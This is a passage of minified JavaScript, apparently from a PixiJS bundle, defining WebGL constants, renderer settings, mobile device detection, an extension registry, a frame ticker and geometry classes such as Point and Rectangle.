NT_2_10_10_10_REV",t[t.UNSIGNED_INT_24_8=34042]="UNSIGNED_INT_24_8",t[t.UNSIGNED_INT_5_9_9_9_REV=35902]="UNSIGNED_INT_5_9_9_9_REV",t[t.BYTE=5120]="BYTE",t[t.SHORT=5122]="SHORT",t[t.INT=5124]="INT",t[t.FLOAT=5126]="FLOAT",t[t.FLOAT_32_UNSIGNED_INT_24_8_REV=36269]="FLOAT_32_UNSIGNED_INT_24_8_REV",t[t.HALF_FLOAT=36193]="HALF_FLOAT"}(Uu||(Uu={})),function(t){t[t.FLOAT=0]="FLOAT",t[t.INT=1]="INT",t[t.UINT=2]="UINT"}(ku||(ku={})),function(t){t[t.NEAREST=0]="NEAREST",t[t.LINEAR=1]="LINEAR"}(Gu||(Gu={})),function(t){t[t.CLAMP=33071]="CLAMP",t[t.REPEAT=10497]="REPEAT",t[t.MIRRORED_REPEAT=33648]="MIRRORED_REPEAT"}(Hu||(Hu={})),function(t){t[t.OFF=0]="OFF",t[t.POW2=1]="POW2",t[t.ON=2]="ON",t[t.ON_MANUAL=3]="ON_MANUAL"}(zu||(zu={})),function(t){t[t.NPM=0]="NPM",t[t.UNPACK=1]="UNPACK",t[t.PMA=2]="PMA",t[t.NO_PREMULTIPLIED_ALPHA=0]="NO_PREMULTIPLIED_ALPHA",t[t.PREMULTIPLY_ON_UPLOAD=1]="PREMULTIPLY_ON_UPLOAD",t[t.PREMULTIPLY_ALPHA=2]="PREMULTIPLY_ALPHA",t[t.PREMULTIPLIED_ALPHA=2]="PREMULTIPLIED_ALPHA"}(Vu||(Vu={})),function(t){t[t.NO=0]="NO",t[t.YES=1]="YES",t[t.AUTO=2]="AUTO",t[t.BLEND=0]="BLEND",t[t.CLEAR=1]="CLEAR",t[t.BLIT=2]="BLIT"}(Xu||(Xu={})),function(t){t[t.AUTO=0]="AUTO",t[t.MANUAL=1]="MANUAL"}(ju||(ju={})),function(t){t.LOW="lowp",t.MEDIUM="mediump",t.HIGH="highp"}($u||($u={})),function(t){t[t.NONE=0]="NONE",t[t.SCISSOR=1]="SCISSOR",t[t.STENCIL=2]="STENCIL",t[t.SPRITE=3]="SPRITE",t[t.COLOR=4]="COLOR"}(Wu||(Wu={})),function(t){t[t.RED=1]="RED",t[t.GREEN=2]="GREEN",t[t.BLUE=4]="BLUE",t[t.ALPHA=8]="ALPHA"}(Yu||(Yu={})),function(t){t[t.NONE=0]="NONE",t[t.LOW=2]="LOW",t[t.MEDIUM=4]="MEDIUM",t[t.HIGH=8]="HIGH"}(qu||(qu={})),function(t){t[t.ELEMENT_ARRAY_BUFFER=34963]="ELEMENT_ARRAY_BUFFER",t[t.ARRAY_BUFFER=34962]="ARRAY_BUFFER",t[t.UNIFORM_BUFFER=35345]="UNIFORM_BUFFER"}(Zu||(Zu={}));var Ku,Qu,Ju,tl,el,il,rl,nl,sl,ol,al,hl,ul,ll,cl,dl,pl,fl,gl,ml,vl={createCanvas:function(t,e){var i=document.createElement("canvas");return i.width=t,i.height=e,i},getWebGLRenderingContext:function(){return WebGLRenderingContext},getNavigator:function(){return navigator},getBaseUrl:function(){var t;return null!==(t=document.baseURI)&&void 0!==t?t:window.location.href},fetch:function(t,e){return fetch(t,e)}},_l=/iPhone/i,yl=/iPod/i,xl=/iPad/i,El=/\biOS-universal(?:.+)Mac\b/i,bl=/\bAndroid(?:.+)Mobile\b/i,Tl=/Android/i,Dl=/(?:SD4930UR|\bSilk(?:.+)Mobile\b)/i,wl=/Silk/i,Sl=/Windows Phone/i,Al=/\bWindows(?:.+)ARM\b/i,Cl=/BlackBerry/i,Il=/BB10/i,Rl=/Opera Mini/i,Pl=/\b(CriOS|Chrome)(?:.+)Mobile/i,Ol=/Mobile(?:.+)Firefox\b/i,Nl=function(t){return void 0!==t&&"MacIntel"===t.platform&&"number"==typeof t.maxTouchPoints&&t.maxTouchPoints>1&&"undefined"==typeof MSStream},Ml=function(t){var e={userAgent:"",platform:"",maxTouchPoints:0};t||"undefined"==typeof navigator?"string"==typeof t?e.userAgent=t:t&&t.userAgent&&(e={userAgent:t.userAgent,platform:t.platform,maxTouchPoints:t.maxTouchPoints||0}):e={userAgent:navigator.userAgent,platform:navigator.platform,maxTouchPoints:navigator.maxTouchPoints||0};var i=e.userAgent,r=i.split("[FBAN");void 0!==r[1]&&(i=r[0]),void 0!==(r=i.split("Twitter"))[1]&&(i=r[0]);var n=function(t){return function(e){return e.test(t)}}(i),s={apple:{phone:n(_l)&&!n(Sl),ipod:n(yl),tablet:!n(_l)&&(n(xl)||Nl(e))&&!n(Sl),universal:n(El),device:(n(_l)||n(yl)||n(xl)||n(El)||Nl(e))&&!n(Sl)},amazon:{phone:n(Dl),tablet:!n(Dl)&&n(wl),device:n(Dl)||n(wl)},android:{phone:!n(Sl)&&n(Dl)||!n(Sl)&&n(bl),tablet:!n(Sl)&&!n(Dl)&&!n(bl)&&(n(wl)||n(Tl)),device:!n(Sl)&&(n(Dl)||n(wl)||n(bl)||n(Tl))||n(/\bokhttp\b/i)},windows:{phone:n(Sl),tablet:n(Al),device:n(Sl)||n(Al)},other:{blackberry:n(Cl),blackberry10:n(Il),opera:n(Rl),firefox:n(Ol),chrome:n(Pl),device:n(Cl)||n(Il)||n(Rl)||n(Ol)||n(Pl)},any:!1,phone:!1,tablet:!1};return s.any=s.apple.device||s.android.device||s.windows.device||s.other.device,s.phone=s.apple.phone||s.android.phone||s.windows.phone,s.tablet=s.apple.tablet||s.android.tablet||s.windows.tablet,s}(globalThis.navigator),Fl={ADAPTER:vl,MIPMAP_TEXTURES:zu.POW2,ANISOTROPIC_LEVEL:0,RESOLUTION:1,FILTER_RESOLUTION:1,FILTER_MULTISAMPLE:qu.NONE,SPRITE_MAX_TEXTURES:function(t){var e,i=!0;return(Ml.tablet||Ml.phone)&&(Ml.apple.device&&(e=navigator.userAgent.match(/OS (\d+)_(\d+)?/))&&parseInt(e[1],10)<11&&(i=!1),Ml.android.device&&(e=navigator.userAgent.match(/Android\s([0-9.]*)/))&&parseInt(e[1],10)<7&&(i=!1)),i?32:4}(),SPRITE_BATCH_SIZE:4096,RENDER_OPTIONS:{view:null,antialias:!1,autoDensity:!1,backgroundColor:0,backgroundAlpha:1,useContextAlpha:!0,clearBeforeRender:!0,preserveDrawingBuffer:!1,width:800,height:600,legacy:!1},GC_MODE:ju.AUTO,GC_MAX_IDLE:3600,GC_MAX_CHECK_COUNT:600,WRAP_MODE:Hu.CLAMP,SCALE_MODE:Gu.LINEAR,PRECISION_VERTEX:$u.HIGH,PRECISION_FRAGMENT:Ml.apple.device?$u.HIGH:$u.MEDIUM,CAN_UPLOAD_SAME_BUFFER:!Ml.apple.device,CREATE_IMAGE_BITMAP:!1,ROUND_PIXELS:!1};!function(t){t[t.WEBGL_LEGACY=0]="WEBGL_LEGACY",t[t.WEBGL=1]="WEBGL",t[t.WEBGL2=2]="WEBGL2"}(Ku||(Ku={})),function(t){t[t.UNKNOWN=0]="UNKNOWN",t[t.WEBGL=1]="WEBGL",t[t.CANVAS=2]="CANVAS"}(Qu||(Qu={})),function(t){t[t.COLOR=16384]="COLOR",t[t.DEPTH=256]="DEPTH",t[t.STENCIL=1024]="STENCIL"}(Ju||(Ju={})),function(t){t[t.NORMAL=0]="NORMAL",t[t.ADD=1]="ADD",t[t.MULTIPLY=2]="MULTIPLY",t[t.SCREEN=3]="SCREEN",t[t.OVERLAY=4]="OVERLAY",t[t.DARKEN=5]="DARKEN",t[t.LIGHTEN=6]="LIGHTEN",t[t.COLOR_DODGE=7]="COLOR_DODGE",t[t.COLOR_BURN=8]="COLOR_BURN",t[t.HARD_LIGHT=9]="HARD_LIGHT",t[t.SOFT_LIGHT=10]="SOFT_LIGHT",t[t.DIFFERENCE=11]="DIFFERENCE",t[t.EXCLUSION=12]="EXCLUSION",t[t.HUE=13]="HUE",t[t.SATURATION=14]="SATURATION",t[t.COLOR=15]="COLOR",t[t.LUMINOSITY=16]="LUMINOSITY",t[t.NORMAL_NPM=17]="NORMAL_NPM",t[t.ADD_NPM=18]="ADD_NPM",t[t.SCREEN_NPM=19]="SCREEN_NPM",t[t.NONE=20]="NONE",t[t.SRC_OVER=0]="SRC_OVER",t[t.SRC_IN=21]="SRC_IN",t[t.SRC_OUT=22]="SRC_OUT",t[t.SRC_ATOP=23]="SRC_ATOP",t[t.DST_OVER=24]="DST_OVER",t[t.DST_IN=25]="DST_IN",t[t.DST_OUT=26]="DST_OUT",t[t.DST_ATOP=27]="DST_ATOP",t[t.ERASE=26]="ERASE",t[t.SUBTRACT=28]="SUBTRACT",t[t.XOR=29]="XOR"}(tl||(tl={})),function(t){t[t.POINTS=0]="POINTS",t[t.LINES=1]="LINES",t[t.LINE_LOOP=2]="LINE_LOOP",t[t.LINE_STRIP=3]="LINE_STRIP",t[t.TRIANGLES=4]="TRIANGLES",t[t.TRIANGLE_STRIP=5]="TRIANGLE_STRIP",t[t.TRIANGLE_FAN=6]="TRIANGLE_FAN"}(el||(el={})),function(t){t[t.RGBA=6408]="RGBA",t[t.RGB=6407]="RGB",t[t.RG=33319]="RG",t[t.RED=6403]="RED",t[t.RGBA_INTEGER=36249]="RGBA_INTEGER",t[t.RGB_INTEGER=36248]="RGB_INTEGER",t[t.RG_INTEGER=33320]="RG_INTEGER",t[t.RED_INTEGER=36244]="RED_INTEGER",t[t.ALPHA=6406]="ALPHA",t[t.LUMINANCE=6409]="LUMINANCE",t[t.LUMINANCE_ALPHA=6410]="LUMINANCE_ALPHA",t[t.DEPTH_COMPONENT=6402]="DEPTH_COMPONENT",t[t.DEPTH_STENCIL=34041]="DEPTH_STENCIL"}(il||(il={})),function(t){t[t.TEXTURE_2D=3553]="TEXTURE_2D",t[t.TEXTURE_CUBE_MAP=34067]="TEXTURE_CUBE_MAP",t[t.TEXTURE_2D_ARRAY=35866]="TEXTURE_2D_ARRAY",t[t.TEXTURE_CUBE_MAP_POSITIVE_X=34069]="TEXTURE_CUBE_MAP_POSITIVE_X",t[t.TEXTURE_CUBE_MAP_NEGATIVE_X=34070]="TEXTURE_CUBE_MAP_NEGATIVE_X",t[t.TEXTURE_CUBE_MAP_POSITIVE_Y=34071]="TEXTURE_CUBE_MAP_POSITIVE_Y",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Y=34072]="TEXTURE_CUBE_MAP_NEGATIVE_Y",t[t.TEXTURE_CUBE_MAP_POSITIVE_Z=34073]="TEXTURE_CUBE_MAP_POSITIVE_Z",t[t.TEXTURE_CUBE_MAP_NEGATIVE_Z=34074]="TEXTURE_CUBE_MAP_NEGATIVE_Z"}(rl||(rl={})),function(t){t[t.UNSIGNED_BYTE=5121]="UNSIGNED_BYTE",t[t.UNSIGNED_SHORT=5123]="UNSIGNED_SHORT",t[t.UNSIGNED_SHORT_5_6_5=33635]="UNSIGNED_SHORT_5_6_5",t[t.UNSIGNED_SHORT_4_4_4_4=32819]="UNSIGNED_SHORT_4_4_4_4",t[t.UNSIGNED_SHORT_5_5_5_1=32820]="UNSIGNED_SHORT_5_5_5_1",t[t.UNSIGNED_INT=5125]="UNSIGNED_INT",t[t.UNSIGNED_INT_10F_11F_11F_REV=35899]="UNSIGNED_INT_10F_11F_11F_REV",t[t.UNSIGNED_INT_2_10_10_10_REV=33640]="UNSIGNED_INT_2_10_10_10_REV",t[t.UNSIGNED_INT_24_8=34042]="UNSIGNED_INT_24_8",t[t.UNSIGNED_INT_5_9_9_9_REV=35902]="UNSIGNED_INT_5_9_9_9_REV",t[t.BYTE=5120]="BYTE",t[t.SHORT=5122]="SHORT",t[t.INT=5124]="INT",t[t.FLOAT=5126]="FLOAT",t[t.FLOAT_32_UNSIGNED_INT_24_8_REV=36269]="FLOAT_32_UNSIGNED_INT_24_8_REV",t[t.HALF_FLOAT=36193]="HALF_FLOAT"}(nl||(nl={})),function(t){t[t.FLOAT=0]="FLOAT",t[t.INT=1]="INT",t[t.UINT=2]="UINT"}(sl||(sl={})),function(t){t[t.NEAREST=0]="NEAREST",t[t.LINEAR=1]="LINEAR"}(ol||(ol={})),function(t){t[t.CLAMP=33071]="CLAMP",t[t.REPEAT=10497]="REPEAT",t[t.MIRRORED_REPEAT=33648]="MIRRORED_REPEAT"}(al||(al={})),function(t){t[t.OFF=0]="OFF",t[t.POW2=1]="POW2",t[t.ON=2]="ON",t[t.ON_MANUAL=3]="ON_MANUAL"}(hl||(hl={})),function(t){t[t.NPM=0]="NPM",t[t.UNPACK=1]="UNPACK",t[t.PMA=2]="PMA",t[t.NO_PREMULTIPLIED_ALPHA=0]="NO_PREMULTIPLIED_ALPHA",t[t.PREMULTIPLY_ON_UPLOAD=1]="PREMULTIPLY_ON_UPLOAD",t[t.PREMULTIPLY_ALPHA=2]="PREMULTIPLY_ALPHA",t[t.PREMULTIPLIED_ALPHA=2]="PREMULTIPLIED_ALPHA"}(ul||(ul={})),function(t){t[t.NO=0]="NO",t[t.YES=1]="YES",t[t.AUTO=2]="AUTO",t[t.BLEND=0]="BLEND",t[t.CLEAR=1]="CLEAR",t[t.BLIT=2]="BLIT"}(ll||(ll={})),function(t){t[t.AUTO=0]="AUTO",t[t.MANUAL=1]="MANUAL"}(cl||(cl={})),function(t){t.LOW="lowp",t.MEDIUM="mediump",t.HIGH="highp"}(dl||(dl={})),function(t){t[t.NONE=0]="NONE",t[t.SCISSOR=1]="SCISSOR",t[t.STENCIL=2]="STENCIL",t[t.SPRITE=3]="SPRITE",t[t.COLOR=4]="COLOR"}(pl||(pl={})),function(t){t[t.RED=1]="RED",t[t.GREEN=2]="GREEN",t[t.BLUE=4]="BLUE",t[t.ALPHA=8]="ALPHA"}(fl||(fl={})),function(t){t[t.NONE=0]="NONE",t[t.LOW=2]="LOW",t[t.MEDIUM=4]="MEDIUM",t[t.HIGH=8]="HIGH"}(gl||(gl={})),function(t){t[t.ELEMENT_ARRAY_BUFFER=34963]="ELEMENT_ARRAY_BUFFER",t[t.ARRAY_BUFFER=34962]="ARRAY_BUFFER",t[t.UNIFORM_BUFFER=35345]="UNIFORM_BUFFER"}(ml||(ml={}));var Ll=i(718),Bl=i(187),Ul=i(575),kl={parse:Ul.parse,format:Ul.format,resolve:Ul.resolve};Fl.RETINA_PREFIX=/@([0-9\.]+)x/,Fl.FAIL_IF_MAJOR_PERFORMANCE_CAVEAT=!1;var Gl,Hl=!1;function zl(t,e){return void 0===e&&(e=[]),e[0]=(t>>16&255)/255,e[1]=(t>>8&255)/255,e[2]=(255&t)/255,e}function Vl(t){return(255*t[0]<<16)+(255*t[1]<<8)+(255*t[2]|0)}var Xl=function(){for(var t=[],e=[],i=0;i<32;i++)t[i]=i,e[i]=i;t[tl.NORMAL_NPM]=tl.NORMAL,t[tl.ADD_NPM]=tl.ADD,t[tl.SCREEN_NPM]=tl.SCREEN,e[tl.NORMAL]=tl.NORMAL_NPM,e[tl.ADD]=tl.ADD_NPM,e[tl.SCREEN]=tl.SCREEN_NPM;var r=[];return r.push(e),r.push(t),r}();function jl(t,e){if(1===e)return(255*e<<24)+t;if(0===e)return 0;var i=t>>16&255,r=t>>8&255;return(255*e<<24)+((i=i*e+.5|0)<<16)+((r=r*e+.5|0)<<8)+((255&t)*e+.5|0)}function $l(t){if(4===t.BYTES_PER_ELEMENT)return t instanceof Float32Array?"Float32Array":t instanceof Uint32Array?"Uint32Array":"Int32Array";if(2===t.BYTES_PER_ELEMENT){if(t instanceof Uint16Array)return"Uint16Array"}else if(1===t.BYTES_PER_ELEMENT&&t instanceof Uint8Array)return"Uint8Array";return null}function Wl(t){return t+=0===t?1:0,--t,t|=t>>>1,t|=t>>>2,t|=t>>>4,1+((t|=t>>>8)|t>>>16)}function Yl(t){return!(t&t-1||!t)}function ql(t){var e=(t>65535?1:0)<<4,i=((t>>>=e)>255?1:0)<<3;return e|=i,e|=i=((t>>>=i)>15?1:0)<<2,(e|=i=((t>>>=i)>3?1:0)<<1)|(t>>>=i)>>1}function Zl(t,e,i){var r,n=t.length;if(!(e>=n||0===i)){var s=n-(i=e+i>n?n-e:i);for(r=e;r<s;++r)t[r]=t[r+i];t.length=s}}function Kl(t){return 0===t?0:t<0?-1:1}Float32Array,Uint32Array,Int32Array,Uint8Array;var Ql=0;function Jl(){return++Ql}var tc={};function ec(t,e,i){if(void 0===i&&(i=3),!tc[e]){var r=(new Error).stack;void 0===r?console.warn("PixiJS Deprecation Warning: ",e+"\nDeprecated since v"+t):(r=r.split("\n").splice(i).join("\n"),console.groupCollapsed?(console.groupCollapsed("%cPixiJS Deprecation Warning: %c%s","color:#614108;background:#fffbe6","font-weight:normal;color:#614108;background:#fffbe6",e+"\nDeprecated since v"+t),console.warn(r),console.groupEnd()):(console.warn("PixiJS Deprecation Warning: ",e+"\nDeprecated since v"+t),console.warn(r))),tc[e]=!0}}var ic,rc={},nc=Object.create(null),sc=Object.create(null);function oc(t,e){var i=Fl.RETINA_PREFIX.exec(t);return i?parseFloat(i[1]):void 0!==e?e:1}!function(){function t(t,e,i){this.canvas=Fl.ADAPTER.createCanvas(),this.context=this.canvas.getContext("2d"),this.resolution=i||Fl.RESOLUTION,this.resize(t,e)}t.prototype.clear=function(){this.context.setTransform(1,0,0,1,0,0),this.context.clearRect(0,0,this.canvas.width,this.canvas.height)},t.prototype.resize=function(t,e){this.canvas.width=Math.round(t*this.resolution),this.canvas.height=Math.round(e*this.resolution)},t.prototype.destroy=function(){this.context=null,this.canvas=null},Object.defineProperty(t.prototype,"width",{get:function(){return this.canvas.width},set:function(t){this.canvas.width=Math.round(t)},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"height",{get:function(){return this.canvas.height},set:function(t){this.canvas.height=Math.round(t)},enumerable:!1,configurable:!0})}();var ac,hc=function(){return(hc=Object.assign||function(t){for(var e,i=arguments,r=1,n=arguments.length;r<n;r++)for(var s in e=i[r])Object.prototype.hasOwnProperty.call(e,s)&&(t[s]=e[s]);return t}).apply(this,arguments)};!function(t){t.Application="application",t.RendererPlugin="renderer-webgl-plugin",t.CanvasRendererPlugin="renderer-canvas-plugin",t.Loader="loader",t.LoadParser="load-parser",t.ResolveParser="resolve-parser",t.CacheParser="cache-parser",t.DetectionParser="detection-parser"}(ac||(ac={}));var uc,lc=function(t){if("function"==typeof t||"object"==typeof t&&t.extension){if(!t.extension)throw new Error("Extension class must have an extension object");var e="object"!=typeof t.extension?{type:t.extension}:t.extension;t=hc(hc({},e),{ref:t})}if("object"!=typeof t)throw new Error("Invalid extension type");return"string"==typeof(t=hc({},t)).type&&(t.type=[t.type]),t},cc={_addHandlers:null,_removeHandlers:null,_queue:{},remove:function(){for(var t=arguments,e=this,i=[],r=0;r<arguments.length;r++)i[r]=t[r];return i.map(lc).forEach((function(t){t.type.forEach((function(i){var r,n;return null===(n=(r=e._removeHandlers)[i])||void 0===n?void 0:n.call(r,t)}))})),this},add:function(){for(var t=arguments,e=this,i=[],r=0;r<arguments.length;r++)i[r]=t[r];return i.map(lc).forEach((function(t){t.type.forEach((function(i){var r=e._addHandlers,n=e._queue;r[i]?r[i](t):(n[i]=n[i]||[],n[i].push(t))}))})),this},handle:function(t,e,i){var r=this._addHandlers=this._addHandlers||{},n=this._removeHandlers=this._removeHandlers||{};if(r[t]||n[t])throw new Error("Extension type "+t+" already has a handler");r[t]=e,n[t]=i;var s=this._queue;return s[t]&&(s[t].forEach((function(t){return e(t)})),delete s[t]),this},handleByMap:function(t,e){return this.handle(t,(function(t){e[t.name]=t.ref}),(function(t){delete e[t.name]}))},handleByList:function(t,e){return this.handle(t,(function(i){var r,n;e.push(i.ref),t===ac.Loader&&(null===(n=(r=i.ref).add)||void 0===n||n.call(r))}),(function(t){var i=e.indexOf(t.ref);-1!==i&&e.splice(i,1)}))}},dc=function(){function t(t){this.items=[],this._name=t,this._aliasCount=0}return t.prototype.emit=function(t,e,i,r,n,s,o,a){if(arguments.length>8)throw new Error("max arguments reached");var h=this,u=h.name,l=h.items;this._aliasCount++;for(var c=0,d=l.length;c<d;c++)l[c][u](t,e,i,r,n,s,o,a);return l===this.items&&this._aliasCount--,this},t.prototype.ensureNonAliasedItems=function(){this._aliasCount>0&&this.items.length>1&&(this._aliasCount=0,this.items=this.items.slice(0))},t.prototype.add=function(t){return t[this._name]&&(this.ensureNonAliasedItems(),this.remove(t),this.items.push(t)),this},t.prototype.remove=function(t){var e=this.items.indexOf(t);return-1!==e&&(this.ensureNonAliasedItems(),this.items.splice(e,1)),this},t.prototype.contains=function(t){return-1!==this.items.indexOf(t)},t.prototype.removeAll=function(){return this.ensureNonAliasedItems(),this.items.length=0,this},t.prototype.destroy=function(){this.removeAll(),this.items=null,this._name=null},Object.defineProperty(t.prototype,"empty",{get:function(){return 0===this.items.length},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"name",{get:function(){return this._name},enumerable:!1,configurable:!0}),t}();Object.defineProperties(dc.prototype,{dispatch:{value:dc.prototype.emit},run:{value:dc.prototype.emit}}),Fl.TARGET_FPMS=.06,function(t){t[t.INTERACTION=50]="INTERACTION",t[t.HIGH=25]="HIGH",t[t.NORMAL=0]="NORMAL",t[t.LOW=-25]="LOW",t[t.UTILITY=-50]="UTILITY"}(uc||(uc={}));var pc,fc=function(){function t(t,e,i,r){void 0===e&&(e=null),void 0===i&&(i=0),void 0===r&&(r=!1),this.next=null,this.previous=null,this._destroyed=!1,this.fn=t,this.context=e,this.priority=i,this.once=r}return t.prototype.match=function(t,e){return void 0===e&&(e=null),this.fn===t&&this.context===e},t.prototype.emit=function(t){this.fn&&(this.context?this.fn.call(this.context,t):this.fn(t));var e=this.next;return this.once&&this.destroy(!0),this._destroyed&&(this.next=null),e},t.prototype.connect=function(t){this.previous=t,t.next&&(t.next.previous=this),this.next=t.next,t.next=this},t.prototype.destroy=function(t){void 0===t&&(t=!1),this._destroyed=!0,this.fn=null,this.context=null,this.previous&&(this.previous.next=this.next),this.next&&(this.next.previous=this.previous);var e=this.next;return this.next=t?null:e,this.previous=null,e},t}(),gc=function(){function t(){var t=this;this.autoStart=!1,this.deltaTime=1,this.lastTime=-1,this.speed=1,this.started=!1,this._requestId=null,this._maxElapsedMS=100,this._minElapsedMS=0,this._protected=!1,this._lastFrame=-1,this._head=new fc(null,null,1/0),this.deltaMS=1/Fl.TARGET_FPMS,this.elapsedMS=1/Fl.TARGET_FPMS,this._tick=function(e){t._requestId=null,t.started&&(t.update(e),t.started&&null===t._requestId&&t._head.next&&(t._requestId=requestAnimationFrame(t._tick)))}}return t.prototype._requestIfNeeded=function(){null===this._requestId&&this._head.next&&(this.lastTime=performance.now(),this._lastFrame=this.lastTime,this._requestId=requestAnimationFrame(this._tick))},t.prototype._cancelIfNeeded=function(){null!==this._requestId&&(cancelAnimationFrame(this._requestId),this._requestId=null)},t.prototype._startIfPossible=function(){this.started?this._requestIfNeeded():this.autoStart&&this.start()},t.prototype.add=function(t,e,i){return void 0===i&&(i=uc.NORMAL),this._addListener(new fc(t,e,i))},t.prototype.addOnce=function(t,e,i){return void 0===i&&(i=uc.NORMAL),this._addListener(new fc(t,e,i,!0))},t.prototype._addListener=function(t){var e=this._head.next,i=this._head;if(e){for(;e;){if(t.priority>e.priority){t.connect(i);break}i=e,e=e.next}t.previous||t.connect(i)}else t.connect(i);return this._startIfPossible(),this},t.prototype.remove=function(t,e){for(var i=this._head.next;i;)i=i.match(t,e)?i.destroy():i.next;return this._head.next||this._cancelIfNeeded(),this},Object.defineProperty(t.prototype,"count",{get:function(){if(!this._head)return 0;for(var t=0,e=this._head;e=e.next;)t++;return t},enumerable:!1,configurable:!0}),t.prototype.start=function(){this.started||(this.started=!0,this._requestIfNeeded())},t.prototype.stop=function(){this.started&&(this.started=!1,this._cancelIfNeeded())},t.prototype.destroy=function(){if(!this._protected){this.stop();for(var t=this._head.next;t;)t=t.destroy(!0);this._head.destroy(),this._head=null}},t.prototype.update=function(t){var e;if(void 0===t&&(t=performance.now()),t>this.lastTime){if((e=this.elapsedMS=t-this.lastTime)>this._maxElapsedMS&&(e=this._maxElapsedMS),e*=this.speed,this._minElapsedMS){var i=t-this._lastFrame|0;if(i<this._minElapsedMS)return;this._lastFrame=t-i%this._minElapsedMS}this.deltaMS=e,this.deltaTime=this.deltaMS*Fl.TARGET_FPMS;for(var r=this._head,n=r.next;n;)n=n.emit(this.deltaTime);r.next||this._cancelIfNeeded()}else this.deltaTime=this.deltaMS=this.elapsedMS=0;this.lastTime=t},Object.defineProperty(t.prototype,"FPS",{get:function(){return 1e3/this.elapsedMS},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"minFPS",{get:function(){return 1e3/this._maxElapsedMS},set:function(t){var e=Math.min(this.maxFPS,t),i=Math.min(Math.max(0,e)/1e3,Fl.TARGET_FPMS);this._maxElapsedMS=1/i},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"maxFPS",{get:function(){return this._minElapsedMS?Math.round(1e3/this._minElapsedMS):0},set:function(t){if(0===t)this._minElapsedMS=0;else{var e=Math.max(this.minFPS,t);this._minElapsedMS=1/(e/1e3)}},enumerable:!1,configurable:!0}),Object.defineProperty(t,"shared",{get:function(){if(!t._shared){var e=t._shared=new t;e.autoStart=!0,e._protected=!0}return t._shared},enumerable:!1,configurable:!0}),Object.defineProperty(t,"system",{get:function(){if(!t._system){var e=t._system=new t;e.autoStart=!0,e._protected=!0}return t._system},enumerable:!1,configurable:!0}),t}(),mc=function(){function t(){}return t.init=function(t){var e=this;t=Object.assign({autoStart:!0,sharedTicker:!1},t),Object.defineProperty(this,"ticker",{set:function(t){this._ticker&&this._ticker.remove(this.render,this),this._ticker=t,t&&t.add(this.render,this,uc.LOW)},get:function(){return this._ticker}}),this.stop=function(){e._ticker.stop()},this.start=function(){e._ticker.start()},this._ticker=null,this.ticker=t.sharedTicker?gc.shared:new gc,t.autoStart&&this.start()},t.destroy=function(){if(this._ticker){var t=this._ticker;this.ticker=null,t.destroy()}},t.extension=ac.Application,t}(),vc=2*Math.PI,_c=180/Math.PI,yc=Math.PI/180;!function(t){t[t.POLY=0]="POLY",t[t.RECT=1]="RECT",t[t.CIRC=2]="CIRC",t[t.ELIP=3]="ELIP",t[t.RREC=4]="RREC"}(pc||(pc={}));var xc=function(){function t(t,e){void 0===t&&(t=0),void 0===e&&(e=0),this.x=0,this.y=0,this.x=t,this.y=e}return t.prototype.clone=function(){return new t(this.x,this.y)},t.prototype.copyFrom=function(t){return this.set(t.x,t.y),this},t.prototype.copyTo=function(t){return t.set(this.x,this.y),t},t.prototype.equals=function(t){return t.x===this.x&&t.y===this.y},t.prototype.set=function(t,e){return void 0===t&&(t=0),void 0===e&&(e=t),this.x=t,this.y=e,this},t.prototype.toString=function(){return"[@pixi/math:Point x="+this.x+" y="+this.y+"]"},t}(),Ec=[new xc,new xc,new xc,new xc],bc=function(){function t(t,e,i,r){void 0===t&&(t=0),void 0===e&&(e=0),void 0===i&&(i=0),void 0===r&&(r=0),this.x=Number(t),this.y=Number(e),this.width=Number(i),this.height=Number(r),this.type=pc.RECT}return Object.defineProperty(t.prototype,"left",{get:function(){return this.x},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"right",{get:function(){return this.x+this.width},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"top",{get:function(){return this.y},enumerable:!1,configurable:!0}),Object.defineProperty(t.prototype,"bottom",{get:function(){return this.y+this.height},enumerable:!1,configurable:!0}),Object.defineProperty(t,"EMPTY",{get:function(){return new t(0,0,0,0)},enumerable:!1,configurable:!0}),t.prototype.clone=function(){return new t(this.x,this.y,this.width,this.height)},t.prototype.copyFrom=function(t){return this.x=t.x,this.y=t.y,this.width=t.width,this.height=t.height,this},t.prototype.copyTo=function(t){return t.x=this.x,t.y=this.y,t.width=this.width,t.height=this.height,t},t.prototype.contains=function(t,e){return!(this.width<=0||this.height<=0)&&t>=this.x&&t<this.x+this.width&&e>=this.y&&e<this.y+this.height},t.prototype.intersects=function(t,e){if(!e){var i=this.x<t.x?t.x:this.x;if((this.right>t.right?t.right:this.right)<=i)return!1;var r=this.y<t.y?t.y:this.y;return(this.bottom>t.bottom?t.bottom:this.bottom)>r}var n=this.left,s=this.right,o=this.top,a=this.bottom;if(s<=n||a<=o)return!1;var h=Ec[0].set(t.left,t.top),u=Ec[1].set(t.left,t.bottom),l=Ec[2].set(t.right,t.top),c=Ec[3].set(t.right,t.bottom);if(l.x<=h.x||u.y<=h.y)return!1;var d=Math.sign(e.a*e.d-e.b*e.c);if(0===d)return!1;if(e.apply(h,h),e.apply(u,u),e.apply(l,l),e.apply(c,c),Math.max(h.x,u.x,l.x,c.x)<=n||Math.min(h.x,u.x,l.x,c.x)>=s||Math.max(h.y,u.y,l.y,c.y)<=o||Math.min(h.y,u.y,l.y,c.y)>=a)return!1;var p=d*(u.y-h.y),f=d*(h.x-u.x),g=p*n+f*o,m=p*s+f*o,v=p*n+f*a,_=p*s+f*a;if(Math.max(g,m,v,_)<=p*h.x+f*h.y||Math.min(g,m,v,_)>=p*c.x+f*c.y)return!1;var y=d*(h.y-l.y),x=d*(l.x-h.x),E=y*n+x*o,b=y*s+x*o,T=y*n+x*a,D=y*s+x*a;return!(Math.max(E,b,T,D)<=y*h.x+x*h.y||Math.min(E,b,T,D)>=y*c.x+x*c.y)},t.prototype.pad=function(t,e){return void 0===t&&(t=0),void 0===e&&(e=t),this.x-=t,this.y-=e,this.width+=2*t,this.height+=2*e,this},t.prototype.fit=function(t){var e=Math.max(this.x,t.x),i=Math.min(this.x+this.width,t.x+t.width),r=Math.max(this.y,t.y),n=Math.min(this.y+this.height,t.y+t.height);return this.x=e,this.width=Math.max(i-e,0),this.y=r,this.height=Math.max(n-r,0),this},t.prototype.ceil=function(t,e){void 0===t&&(t=1),void 